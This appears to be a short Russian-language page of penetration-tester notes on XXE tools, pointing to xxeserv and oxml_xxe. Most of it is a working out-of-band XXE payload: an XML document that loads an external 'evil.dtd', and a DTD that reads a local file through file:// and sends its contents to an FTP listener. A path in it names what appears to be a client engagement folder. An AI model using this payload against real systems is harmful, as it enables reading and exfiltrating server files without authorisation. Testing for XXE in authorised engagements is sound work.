# Tools

## xxeserv

ftp server для отлова xxe (Go): [https://github.com/staaldraad/xxeserv](https://github.com/staaldraad/xxeserv)

пример использования

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dtd_test [<!ENTITY % sp SYSTEM "http://127.0.0.1:9393/evil.dtd"> %sp; %param1; %param2; ]>
<dtd_test>&exfil;</dtd_test>
```

evil.dtd

```markup
<!ENTITY % data SYSTEM "file:///Users/o.petrakov/Work/pentest/projects/unicredit_web_08_2020/scripts/socket.io/test.txt">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://127.0.0.1:2121/%data;'>">
<!ENTITY % param2 "<!ENTITY exfil2 SYSTEM 'file:///Users/'>">
```

## oxml\_xxe

сгенерировать документы и картинки с xxe нагрузкой: [https://github.com/BuffaloWill/oxml\_xxe](https://github.com/BuffaloWill/oxml\_xxe)
